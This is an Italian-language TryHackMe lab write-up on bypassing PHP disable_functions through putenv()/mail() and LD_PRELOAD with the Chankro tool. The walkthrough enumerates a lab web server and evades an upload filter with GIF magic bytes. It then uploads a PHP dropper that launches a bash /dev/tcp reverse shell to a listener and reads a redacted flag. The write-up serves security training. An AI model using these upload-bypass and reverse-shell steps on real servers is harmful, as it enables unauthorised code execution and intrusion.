
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/bypassdisablefunctions

## Introduzione

Che cos'è una vulnerabilità di caricamento file?

Questa vulnerabilità si verifica nelle applicazioni web in cui esiste la possibilità di caricare un file senza essere controllati da un sistema di sicurezza che limita i potenziali pericoli. 
 
Consente a un aggressore di caricare file con codice (script come .php , .aspx e altri) ed eseguirli sullo stesso server; maggiori informazioni in questa [stanza](https://tryhackme.com/room/uploadvulns) .  
 
Perché questa stanza?  
  
Tra le misure tipicamente applicate c'è la disabilitazione di funzioni pericolose che potrebbero eseguire comandi del sistema operativo o avviare processi. Funzioni come system() o shell_exec() vengono spesso disabilitate tramite direttive PHP definite nel file di configurazione .ini di PHP . Altre funzioni, forse meno note come dl() (che consente di caricare dinamicamente un'estensione PHP ), possono passare inosservate all'amministratore di sistema e non essere disabilitate. La cosa usuale in un test di intrusione è elencare quali funzioni sono abilitate nel caso in cui qualcuna sia stata dimenticata.
 
Una delle tecniche più semplici da implementare e poco diffusa è l'abuso delle funzionalità mail() e putenv(). Questa tecnica non è nuova, era già stata segnalata a [PHP nel 2008](https://bugs.php.net/bug.php?id=46741) da gat3way, ma funziona ancora oggi. Tramite la funzione putenv(), possiamo modificare le variabili d'ambiente, assegnando il valore desiderato alla variabile LD_PRELOAD. LD_PRELOAD ci permetterà di precaricare una libreria .so prima delle altre , in modo che se un programma utilizza una funzione di una libreria (ad esempio libc.so), eseguirà quella presente nella nostra libreria invece di quella che dovrebbe eseguire. In questo modo, possiamo dirottare o "agganciare" le funzioni, modificandone il comportamento a piacimento.
 
[Chankro](https://github.com/TarlogicSecurity/Chankro) : strumento per eludere disable_functions e open_basedir

Tramite Chankro, generiamo uno script PHP che fungerà da dropper, creando sul server una libreria .so e lo script binario (un meterpreter , ad esempio) o bash (una reverse shell, ad esempio) che vogliamo eseguire liberamente e che in seguito chiamerà putenv() e mail() per avviare il processo.
 
Strumento di installazione:
 
```
git clone https://github.com/TarlogicSecurity/Chankro.git
```

```
cd Chankro
```

```
python2 chankro.py --help
``` 

--arch = Architettura del sistema vittima 32 o 64.

--input = file con il payload da eseguire

--output = Nome del file PHP che andrai a creare; questo è il file che dovrai caricare.

--path = È necessario specificare il percorso assoluto in cui si trova il file PHP caricato . Ad esempio, se il file si trova nella cartella uploads, DOCUMENTROOT + uploads. 

```
nano c.sh
```
```
#!/bin/bash

whoami > /var/www/thml/a.txt
```

```
python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html
```
Ora, quando eseguiamo lo script PHP sul server web, verranno creati i file necessari per eseguire il nostro payload.
```
root@ip-10-10-225-22:~/Chankro# python chankro.py --arch 64 --input c.sh --output tryhackme.php --path /var/www/html


     -=[ Chankro ]=-
    -={ @TheXC3LL }=-


[+] Binary file: c.sh
[+] Architecture: x64
[+] Final PHP: tryhackme.php


[+] File created!

```
Il mio comando è stato eseguito correttamente e ho creato un file nella directory con l'output del comando.


## Reasy Set Go

Comprometti la macchina e individua il file flag.txt

```
nmap -Pn -O -sVC -v -p- 10.10.99.149
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1f:97:54:30:24:74:f2:fa:15:ed:f3:35:84:dc:6c:d0 (RSA)
|   256 a7:21:78:6d:a6:05:7e:5a:0f:7e:53:65:0a:c4:53:49 (ECDSA)
|_  256 57:1c:22:ac:59:69:62:cb:94:bd:e9:9f:67:68:23:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ecorp - Jobs

```

visioniamo il sito e troviamo
http://10.10.99.149/cv.php

dover poter allegare il nostro CV

facciamo un po di enumerazione  alla ricerca di directory
```
ffuf -u http://10.10.99.149/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
troviamo
```
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

facciamo un po di enumerazione  alla ricerca di files
```
ffuf -u http://10.10.99.149/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt
```
troviamo
```
index.html              [Status: 200, Size: 12012, Words: 3434, Lines: 244]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
phpinfo.php             [Status: 200, Size: 68199, Words: 3202, Lines: 747]
.                       [Status: 200, Size: 12012, Words: 3434, Lines: 244]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswds              [Status: 403, Size: 277, Words: 20, Lines: 10]
.htgroup                [Status: 403, Size: 277, Words: 20, Lines: 10]
wp-forum.phps           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htaccess.bak           [Status: 403, Size: 277, Words: 20, Lines: 10]
.htuser                 [Status: 403, Size: 277, Words: 20, Lines: 10]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10]
.ht                     [Status: 403, Size: 277, Words: 20, Lines: 10]
cv.php                  [Status: 200, Size: 4153, Words: 1078, Lines: 98]
```
Ci sono di interessante  sia una cartella `/uploads/` che un file `phpinfo.php`

http://10.10.99.149/phpinfo.php

come impostazione troviamo 
```
disable_functions	exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
```

```
`open_basedir`: vuoto
```

```
`$_SERVER['DOCUMENT_ROOT']`:`/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`
```

se carichiamo su CV un file PHP, questo viene rifiutato perchè controllerà il tipo di file direttamente con la libreria file o magic header

quindi **creiamo un file contenente i magic byte GIF** per eludere il filtro

```
echo 'GIF89a;' > gif.txt
```
creiamo un file di test exploit
```
echo "<?php echo 'testexploit'; ?>" > testexploit.php
```
concateniamo i files creati

```
cat gif.txt testexploit.php > codice_offuscato.php
```
carichiamo il file su
http://10.10.99.149/cv.php
ed ora otteniamo il file caricato con successo su
http://10.10.99.149/uploads/codice_offuscato.php

**Problema! molte funzioni che consentono l'esecuzione di comandi sono bloccate.** Aggiriamo  il problema  usando [`chankro`](https://github.com/TarlogicSecurity/Chankro).

- creiamo una reverse shell con l'aiuto di
https://www.revshells.com/

```
nano revsh.sh
```
```
bash -c 'bash -i >& /dev/tcp/10.10.225.22/1234 0>&1'
```

apriamo un altro terminale e ci mettiamo in ascolto
```
nc -lvnp 1234
```


Usiamo `chankro` per creare il dropper PHP bypass. Abbiamo già trovato il percorso della radice web nella `phpinfo.php`pagina.

```
python chankro.py --arch 64 --input revsh.sh --output dropper.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads
```

falsifichiamo come prima la firma GIF
```
cat gif.txt dropper.php > dropper_obfu.php
```
carichiamo il file ed successivamente andiamo su 
```
http://10.10.99.149/uploads/dropper_obfu.php
```
per attivare la nostra reverse shell!
```
www-data@ubuntu:/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads$ 
```
ora ci rimane solo di cercare la nostra flag
```
www-data@ubuntu:/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads$ cd /home
<ml/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads$ cd /home                       
www-data@ubuntu:/home$ ls
ls
s4vi
www-data@ubuntu:/home$ cd s4vi
cd s4vi
www-data@ubuntu:/home/s4vi$ ls
ls
flag.txt
www-data@ubuntu:/home/s4vi$ cat flag.txt
cat flag.txt
thm{xxxxxxxxxx}
www-data@ubuntu:/home/s4vi$ 
```

```
thm{xxxxxxxxxxx}
```

